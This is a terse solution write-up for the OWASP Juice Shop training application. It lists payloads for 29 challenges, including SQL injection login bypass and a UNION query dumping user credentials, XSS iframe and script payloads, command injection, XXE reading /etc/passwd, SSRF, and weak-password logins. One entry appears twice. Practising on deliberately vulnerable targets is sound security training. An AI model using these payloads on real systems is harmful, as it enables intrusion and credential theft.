# OWASP Juice Shop - Complete Solution Writeup

## Total Challenges Solved: 29


## SQL Injection

### Admin Login
SQL Injection in login: email=' or 1=1-- password=anything

### Database Schema
Search SQL injection: apple')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--

### Admin Login
SQL Injection in login: email=' or 1=1-- password=anything

### Delete Five-Star Feedback
DELETE endpoint SQL injection: /api/Feedbacks/1 or 1=1--


## XSS

### DOM XSS
Search DOM XSS: http://155.138.197.128:5000/#/search?q=%3Ciframe%20src%3D%22javascript%3Aalert%28%60xss%60%29%22%3E

### Reflected XSS
Track Order XSS: http://155.138.197.128:5000/#/track-result?id=%3Ciframe%20src%3Djavascript%3Aalert%28%60xss%60%29%3E

### Persistent XSS
Stored XSS in feedback: <script>alert('XSS')</script>


## Sensitive Data Exposure

### Score Board
Found at /#/score-board (guessed URL or found in JS)

### Confidential Document
Direct access: /ftp/acquisitions.md


## Broken Authentication

### Admin Registration
Register with role:admin in request

### Weak Password: admin@juice-sh.op
Password: admin123

### Weak Password: jim@juice-sh.op
Password: ncc-1701

### Weak Password: bender@juice-sh.op
Password: OhG0dPlease1nsertLiquor!


## Broken Access Control

### Admin Section Access
Direct URL access: /#/administration

### View Basket #1
Direct access to /rest/basket/1

### Forged Feedback
Post feedback with UserId:1 in request


## Security Misconfiguration

### Error Handling
Access non-existent endpoint for stack trace

### Deprecated Interface
Access /b2b/v2/orders


## XXE

### XXE Data Access
Upload SVG with XXE payload to read /etc/passwd


## Cryptographic Issues

### Forged Coupon
Applied coupon: DEC20-10


## Injection

### NoSQL Injection
Query manipulation with $ne operator

### Command Execution
Command injection: 127.0.0.1 & ls


## Business Logic

### Zero Stars
Submit feedback with rating:0

### Payback Time
Add items with negative quantity

### Product Tampering
Direct product modification via PUT


## Input Validation

### Email Validation Bypass
Registered with: admin@juice-sh.op'

### Upload Type
Uploaded PHP as PDF


## CSRF

### CSRF
Profile change without CSRF token


## SSRF

### SSRF
SSRF payload: http://localhost:3000/

